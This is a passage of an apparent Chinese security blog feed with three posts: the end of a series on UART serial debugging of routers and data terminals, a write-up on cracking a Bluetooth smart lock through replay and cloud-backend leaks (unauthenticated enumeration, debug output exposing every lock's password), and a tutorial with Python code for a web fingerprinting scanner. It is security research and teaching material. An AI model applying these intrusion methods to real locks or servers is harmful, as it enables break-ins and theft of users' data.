<p>串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image78.jpg" alt=""></p>
<h3 id="案例三：调试某路由器"><a href="#案例三：调试某路由器" class="headerlink" title="案例三：调试某路由器"></a>案例三：调试某路由器</h3><p>在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image79.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image80.jpg" alt=""></p>
<p>设置波特率为57600，串口输出正确，并可执行命令。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image81.jpg" alt=""></p>
<h3 id="案例四：调试某路由器"><a href="#案例四：调试某路由器" class="headerlink" title="案例四：调试某路由器"></a>案例四：调试某路由器</h3><p>在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image82.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image83.jpg" alt=""></p>
<p>设置波特率为57600，串口输出正确，并可执行命令。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image84.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image85.jpg" alt=""></p>
<p>通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image86.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image87.jpg" alt=""></p>
<h3 id="案例五：调试某无线数据终端"><a href="#案例五：调试某无线数据终端" class="headerlink" title="案例五：调试某无线数据终端"></a>案例五：调试某无线数据终端</h3><p>拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image88.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image89.jpg" alt=""><br>因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image90.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image91.jpg" alt=""></p>
<h3 id="案例六：调试某无线数据终端"><a href="#案例六：调试某无线数据终端" class="headerlink" title="案例六：调试某无线数据终端"></a>案例六：调试某无线数据终端</h3><p>拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image122.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image123.jpg" alt=""></p>
<p>设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image124.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image125.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上节介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="UART串口调试" scheme="http://www.future-sec.com/tags/UART%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>如何破解一个蓝牙锁</title>
    <link href="http://www.future-sec.com/how-to-crack-a-ble-lock.html"/>
    <id>http://www.future-sec.com/how-to-crack-a-ble-lock.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:11.356Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智能锁中，因为低功耗蓝牙技术的推广，以及受外部环境限制小，通过手机APP交互方便等特点，很多智能锁采用的就是以BLE蓝牙芯片作为控制单元，控制电机或锁簧转动的模式，实现开关锁功能。与其他的安全问题相比，锁具的被破解，可能造成的危害更大，本文通过以破解某型号蓝牙锁，来展示目前蓝牙智能锁可能面临的安全风险。</p>
<h2 id="蓝牙锁介绍"><a href="#蓝牙锁介绍" class="headerlink" title="蓝牙锁介绍"></a>蓝牙锁介绍</h2><p> 蓝牙锁由于不受外部环境限制，功耗较低，和手机交互方便，目前用的比较多,形状也五花八门，例如目前使用最广泛的一些智能蓝牙锁。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage9.jpg" alt="img"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage10.jpg" alt="img"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage11.jpg" alt="img"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage12.jpg" alt="img"></p>
<h2 id="如何去破解一个蓝牙锁"><a href="#如何去破解一个蓝牙锁" class="headerlink" title="如何去破解一个蓝牙锁"></a>如何去破解一个蓝牙锁</h2><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage13.jpg" alt="img"></p>
<h3 id="目标介绍"><a href="#目标介绍" class="headerlink" title="目标介绍"></a>目标介绍</h3><p>这个属于低功耗蓝牙锁，使用app 绑定之后可以开启，还能共享密码，修改密码。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage14.jpg" alt="img"></p>
<h3 id="内部构架"><a href="#内部构架" class="headerlink" title="内部构架"></a>内部构架</h3><p>显微镜查看电路板<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/IMG_2214.jpg" alt="img"></p>
<p>拆解<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/IMG_2216.jpg" alt="img"></p>
<p>蓝牙锁内部搭载了一块CC2541蓝牙芯片，通过控制电机驱动芯片，带动卡榫运转，从而形成拉锁的开关。CC2541是TI推出的一款专门适用于BLE和专用的2.4GHz应用的SOC芯片解决方案,CC254X在目前物联网蓝牙通信解决方案中，市场占有率很高，应用场景非常广泛。</p>
<h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>使用app初步连接探测，可以看到</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage16.jpg" alt="img"></p>
<h3 id="开锁流程"><a href="#开锁流程" class="headerlink" title="开锁流程"></a>开锁流程</h3><p>Logcat 查看app日志</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage17.jpg" alt="img"></p>
<p>流程为</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171123170725.jpg" alt="img"></p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>一般对于蓝牙锁的攻击方式有三种</p>
<p>1、重放攻击<br>2、暴力破解(6位数字)<br>3、云端漏洞</p>
<h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage18.jpg" alt="img"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage19.jpg" alt="img"></p>
<p>通过蓝牙抓包分析，发现通信过程没有加密，可以重放获取认证密码，但如果要模拟真实的智能锁攻击场景，显然不能通过如此显眼的方式，真实环境中往往很难有一个给我们抓包或劫持的场景，所以最好的方式是远程无接触开锁，需要去找云端的漏洞。</p>
<h3 id="云端漏洞"><a href="#云端漏洞" class="headerlink" title="云端漏洞"></a>云端漏洞</h3><p>云端是Thinkphp5 写的，稍微看了一下,存在有两个漏洞。无认证可以遍历所有id拿到所有锁的信息</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage20.jpg" alt="img"></p>
<p>没有关闭调试模式会泄露信息,传入一个空的id会吧所有锁的信息报错显示出来，泄露所有锁的密码以及绑定的电话号码mac地址等信息。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage21.jpg" alt="img"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>对于真实的破解锁场景，最好用一个手机app来开锁掩人耳目，综合以上分析，编写一个开锁Android app 。<br>工作流程为</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171123170725.jpg" alt="img"></p>
<p>利用 com.inuker.bluetooth 库快速开发</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage22.jpg" alt="img"></p>
<p>APP界面</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15117578788731.jpg" alt="img"></p>
<p>视频演示</p>
<p> <a href="https://v.qq.com/x/page/b051058vicv.html" rel="external nofollow noopener noreferrer" target="_blank">https://v.qq.com/x/page/b051058vicv.html</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>ti官方页面  <a href="http://www.ti.com.cn/product/cn/CC2541" rel="external nofollow noopener noreferrer" target="_blank">http://www.ti.com.cn/product/cn/CC2541</a><br>cc2541蓝牙芯片手册  <a href="https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html" rel="external nofollow noopener noreferrer" target="_blank">https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html</a> </p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="智能锁" scheme="http://www.future-sec.com/tags/%E6%99%BA%E8%83%BD%E9%94%81/"/>
    
      <category term="蓝牙攻击" scheme="http://www.future-sec.com/tags/%E8%93%9D%E7%89%99%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>浅谈现代化指纹识别及工具编写</title>
    <link href="http://www.future-sec.com/yet-another-web-fingerprinter.html"/>
    <id>http://www.future-sec.com/yet-another-web-fingerprinter.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:09.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用指纹识别是一个长久可研究的课题，本文主要探讨如何建立高效可靠的指纹识别方法。</p>
<h2 id="传统的指纹识别"><a href="#传统的指纹识别" class="headerlink" title="传统的指纹识别"></a>传统的指纹识别</h2><p>一些扫描器里面使用的比较多的都是通过特殊路径  静态文件的md5 值或者大小 关键词等，例如使用比较广泛的一个指纹数据库 。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15047737007020.jpg" alt="img"><br>存在几个问题</p>
<ol>
<li>效率太低，每一个路径都需要访问一次。容易被waf拦截</li>
<li>目前很多网站的静态资源 cdn于gzip 压缩，md5 其实是不一样的 ，识别率很低 </li>
</ol>
<h2 id="现代化指纹识别"><a href="#现代化指纹识别" class="headerlink" title="现代化指纹识别"></a>现代化指纹识别</h2><p>怎么来快速的精确的指纹识别，观察了大部分的web系统发现，访问首页并且获取response header  能识别出80% 的app<br>例如WordPress，discuz  会把独特的cookie放到header 里面。<br>discuz  的关键词  _saltkey=<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15109122240334.jpg" alt="img"></p>
<p>默认首页也会有很多固定的关键词，  WordPress   wp-conetnt<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15109123220322.jpg" alt="img"></p>
<p>剩下的指纹再去特殊url提取，这样效率和准确率会提高很多很多。</p>
<h2 id="现代化指纹识别方案"><a href="#现代化指纹识别方案" class="headerlink" title="现代化指纹识别方案"></a>现代化指纹识别方案</h2><h3 id="指纹库设计"><a href="#指纹库设计" class="headerlink" title="指纹库设计"></a>指纹库设计</h3><h4 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h4><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191426.jpg" alt="img"><br>指纹库类型目前有3种 ，当然后续还需要加上正则。<br>finger 规则是一个 string 之后的python 字典,里面有例如状态吗,规则等字段,例如  weblogic 的指纹规则</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">'port'</span>:<span class="number">7001</span>,<span class="string">'url'</span>: <span class="string">'/console/login/LoginForm.jsp'</span>, <span class="string">'code'</span>: <span class="number">200</span>, <span class="string">'grep'</span>: <span class="string">'WebLogic Server'</span>&#125;</div></pre></td></tr></table></figure>
<p>下面介绍每一种指纹库实例</p>
<h4 id="指纹规则"><a href="#指纹规则" class="headerlink" title="指纹规则"></a>指纹规则</h4><h5 id="web-header-contain"><a href="#web-header-contain" class="headerlink" title="web_header_contain"></a>web_header_contain</h5><p>首页 response 里面的 header 查找特征符<br>速度最快,优先极最高。很多web cms 都会写特殊的cookie 键值。<br>例如 discuz,jboss,wordpress 等。<br>规则编写,以discuz 为例 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  -I    www.cctry.com</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Server: Microsoft-IIS/6.0</div><div class="line">Connection: keep-alive</div><div class="line">Date: Thu, 07 Jan 2016 18:22:34 GMT</div><div class="line">Content-Type: text/html; charset=gbk</div><div class="line">Content-Length: 0</div><div class="line">X-Powered-By: PHP/5.2.17</div><div class="line">Set-Cookie: Vguy_2132_saltkey=O6srsEYk; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/; httponly</div><div class="line">Set-Cookie: Vguy_2132_lastvisit=1452187342; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/</div><div class="line">Set-Cookie: Vguy_2132_sid=MwE6e0; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</div><div class="line">Set-Cookie: Vguy_2132_lastact=1452190942%09index.php%09; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/</div><div class="line">X-Daa-Tunnel: hop_count=1</div></pre></td></tr></table></figure>
<p>经过分析,字符串 _saltkey=  为discuz  header 中的规则<br>具体规则如下<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191240.jpg" alt="img"></p>
<h5 id="web-index-contain"><a href="#web-index-contain" class="headerlink" title="web_index_contain"></a>web_index_contain</h5><p>在缓存的首页里面查找关键词或者正则匹配<br>优先级次之,只需要 get请求一次即可。<br>例如Office Anywhere   指纹 编写流程<br>数据包分析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  http://125.91.218.186:8000/   |  grep   <span class="string">'/images/tongda.ico'</span></div><div class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</div><div class="line">                                 Dload  Upload   Total   Spent    Left  Speed</div><div class="line">100  2001  100  2001    0     0  11795      0 --:--:-- --:--:-- --:--:-- 11840</div><div class="line">&lt;link rel=<span class="string">"shortcut icon"</span> href=<span class="string">"/images/tongda.ico"</span>&gt;</div></pre></td></tr></table></figure>
<p>规则编写<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191233.jpg" alt="img"></p>
<h5 id="web-url-contain"><a href="#web-url-contain" class="headerlink" title="web_url_contain"></a>web_url_contain</h5><p>特殊url 查找指定的关键词(返回状态码也指定)。<br>优先级最低。<br>例如  weblogic 的指纹 finger 过程<br>数据包分析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">➜  tools  curl  -I     http://202.97.194.9:7001/console/login/LoginForm.jsp</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Cache-Control: no-cache</div><div class="line">Date: Thu, 07 Jan 2016 18:53:28 GMT</div><div class="line">Pragma: no-cache</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line">Expires: Thu, 01 Jan 1970 00:00:00 GMT</div><div class="line">Set-Cookie: ADMINCONSOLESESSION=XQXrWT0LQTvpf8Jv75nMnQB9vN0cGppy7bTfJxfH9S673VTGP1Wl!1715621632; path=/</div><div class="line">Content-Language: zh-CN</div><div class="line">X-Powered-By: Servlet/2.5 JSP/2.1</div></pre></td></tr></table></figure>
<p>规则</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="string">'url'</span>: <span class="string">'/console/login/LoginForm.jsp'</span>, <span class="string">'code'</span>: <span class="number">200</span>, <span class="string">'grep'</span>: <span class="string">'WebLogic Server'</span>&#125;</div></pre></td></tr></table></figure>
<p>表<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/QQ截图20171127191224.jpg" alt="img"></p>
<h3 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h3><p>指纹识别模块代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="string">"""</span></div><div class="line"> *@Projet  Yafinger</div><div class="line"> *@Author  yaseng@uauc.net</div><div class="line"> *@Desc    playweb finger modules</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> ast,time</div><div class="line"><span class="keyword">import</span> config</div><div class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_web_app</span><span class="params">(url)</span>:</span></div><div class="line">    rsp_index = util.http_get(url)</div><div class="line">    str_index = <span class="string">""</span></div><div class="line">    <span class="keyword">if</span> rsp_index == <span class="keyword">None</span> :</div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">    list_app=[]</div><div class="line">    fingers=config.get(<span class="string">'fingers'</span>);</div><div class="line">    <span class="keyword">for</span>  finger  <span class="keyword">in</span>   fingers :</div><div class="line">        rule = ast.literal_eval(finger[<span class="string">'finger'</span>])</div><div class="line">        <span class="keyword">if</span> finger[<span class="string">'type'</span>] == <span class="string">'web_index_contain'</span>: </div><div class="line">            <span class="comment"># limit header and  body and code  exp : &#123;'header':'jsessionid=','code': 200, 'grep': '.action'&#125;</span></div><div class="line">            <span class="keyword">if</span> rule.has_key(<span class="string">'header'</span>) <span class="keyword">and</span>  rule[<span class="string">'header'</span>] <span class="keyword">not</span> <span class="keyword">in</span>   str(rsp_index[<span class="string">'headers'</span>]).lower()  : </div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">if</span> rsp_index[<span class="string">'code'</span>] == rule[<span class="string">'code'</span>] <span class="keyword">and</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span> rsp_index[<span class="string">'data'</span>] :</div><div class="line">                list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                util.log(<span class="string">"url:%s app:%s"</span> % (url, finger[<span class="string">'app_name'</span>]))</div><div class="line">    </div><div class="line">        <span class="keyword">elif</span> finger[<span class="string">'type'</span>] == <span class="string">'web_url_contain'</span> :</div><div class="line">             rsp_tmp = util.http_get(url + rule[<span class="string">'url'</span>])</div><div class="line">             <span class="keyword">if</span> rsp_tmp == <span class="keyword">None</span> :</div><div class="line">                 <span class="keyword">continue</span></div><div class="line">             <span class="keyword">if</span> rsp_tmp[<span class="string">'code'</span>] == rule[<span class="string">'code'</span>] <span class="keyword">and</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span> rsp_tmp[<span class="string">'data'</span>] :</div><div class="line">                 list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                 util.log(<span class="string">"url:%s app:%s"</span> % (url + rule[<span class="string">'url'</span>], finger[<span class="string">'app_name'</span>]))</div><div class="line">        <span class="keyword">elif</span>  finger[<span class="string">'type'</span>] == <span class="string">'web_header_contain'</span> :</div><div class="line"></div><div class="line">            <span class="keyword">if</span>  rule[<span class="string">'grep'</span>]  <span class="keyword">in</span>  str(rsp_index[<span class="string">'headers'</span>]).lower() :</div><div class="line">                list_app.append(&#123;<span class="string">'app_id'</span>:finger[<span class="string">'id'</span>], <span class="string">'url'</span>:url&#125;)</div><div class="line">                util.log(<span class="string">"url:%s app:%s"</span> % (url , finger[<span class="string">'app_name'</span>]))</div><div class="line">                        </div><div class="line">            </div><div class="line">        time.sleep(<span class="number">0.01</span>)</div><div class="line">    <span class="keyword">return</span>  list_app</div></pre></td></tr></table></figure>
<h3 id="单独识别"><a href="#单独识别" class="headerlink" title="单独识别"></a>单独识别</h3><p>简单调用指纹识别模块代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="string">"""</span></div><div class="line"> *@Projet  Yafinger</div><div class="line"> *@Author  yaseng@uauc.net</div><div class="line"> *@Desc    yafinger test </div><div class="line">     __    __            ___                                         </div><div class="line">    /\ \  /\ \         /'___\  __                                    </div><div class="line">    \ `\`\\/'/   __   /\ \__/ /\_\     ___       __       __   _ __  </div><div class="line">     `\ `\ /'  /'__`\ \ \ ,__\\/\ \  /' _ `\   /'_ `\   /'__`\/\`'__\</div><div class="line">       `\ \ \ /\ \L\.\_\ \ \_/ \ \ \ /\ \/\ \ /\ \L\ \ /\  __/\ \ \/ </div><div class="line">         \ \_\\ \__/.\_\\ \_\   \ \_\\ \_\ \_\\ \____ \\ \____\\ \_\ </div><div class="line">          \/_/ \/__/\/_/ \/_/    \/_/ \/_/\/_/ \/___L\ \\/____/ \/_/ </div><div class="line">                                                 /\____/             </div><div class="line">                                                 \_/__/ </div><div class="line">"""</div><div class="line"><span class="keyword">import</span>   os, time, sys, Queue, threading, ast</div><div class="line"><span class="keyword">import</span> config</div><div class="line"><span class="keyword">from</span>   lib                <span class="keyword">import</span> util</div><div class="line"><span class="keyword">from</span>   lib.db             <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span>   optparse           <span class="keyword">import</span> OptionParser</div><div class="line"><span class="keyword">from</span>   modules            <span class="keyword">import</span> finger</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    usage= <span class="string">'''%prog --host  host --port  port --finger  &lt;all|app_name&gt;   \r\nExample:%prog  --url  http://127.0.0.1    --finger phpmyadmin  '''</span></div><div class="line">    parser = OptionParser(usage=usage)</div><div class="line">    parser.add_option(<span class="string">"-u"</span>, <span class="string">"--url"</span>, dest=<span class="string">"url"</span>, help=<span class="string">"target url"</span>)</div><div class="line">    parser.add_option(<span class="string">"-f"</span>, <span class="string">"--finger"</span>, dest=<span class="string">"finger"</span>, help=<span class="string">"finger_db app_name,default all "</span>, default=<span class="string">"all"</span>)</div><div class="line">    options, arguments = parser.parse_args()</div><div class="line">    <span class="keyword">if</span> options.url == <span class="keyword">None</span> :</div><div class="line">        parser.print_help() </div><div class="line">        exit(<span class="number">0</span>)</div><div class="line">    db = MySQL(config.db_config)</div><div class="line">    sql_finger_where=<span class="string">' '</span>  <span class="keyword">if</span> options.finger == <span class="string">'all'</span> <span class="keyword">else</span> <span class="string">"  and  app_name='%s' "</span>  % options.finger</div><div class="line">    db.query(<span class="string">"SELECT  * from  pw_finger_db  where  `enable`=1   %s "</span>  % sql_finger_where)</div><div class="line">    fingers = db.fetch_all()</div><div class="line">    <span class="keyword">if</span> len(fingers) == <span class="number">0</span> :</div><div class="line">        util.log(<span class="string">'finger app_name %s not found'</span> % options.finger ,<span class="number">3</span>,<span class="string">'finger'</span>) </div><div class="line">    config.set(<span class="string">"fingers"</span>,fingers)</div><div class="line">    util.log(<span class="string">"load fingers count %d"</span> % len(fingers),<span class="number">1</span>,<span class="string">'finger'</span>)</div><div class="line">    finger.get_web_app(options.url)</div></pre></td></tr></table></figure>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15109322329056.jpg" alt="img"></p>
<h3 id="批量识别"><a href="#批量识别" class="headerlink" title="批量识别"></a>批量识别</h3><p> 可以使用线程池来实现批量指纹识别。</p>
<h3 id="指纹结果"><a href="#指纹结果" class="headerlink" title="指纹结果"></a>指纹结果</h3><p>融合到系统中指纹保存在数据库中，本模块可以快速整合到扫描器或者其他项目中。</p>
<h2 id="yafinger"><a href="#yafinger" class="headerlink" title="yafinger"></a>yafinger</h2><p>yet another  web  fingerprinter<br><a href="https://github.com/yaseng/yafinger" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/yaseng/yafinger</a></p>
<h2 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h2><ol>
<li>指纹库需要补充</li>
<li>可以不局限于web指纹</li>
<li>某些情况可能目前的指纹规则不符合，还需要添加新的指纹规则，例如正则</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="指纹识别" scheme="http://www.future-sec.com/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
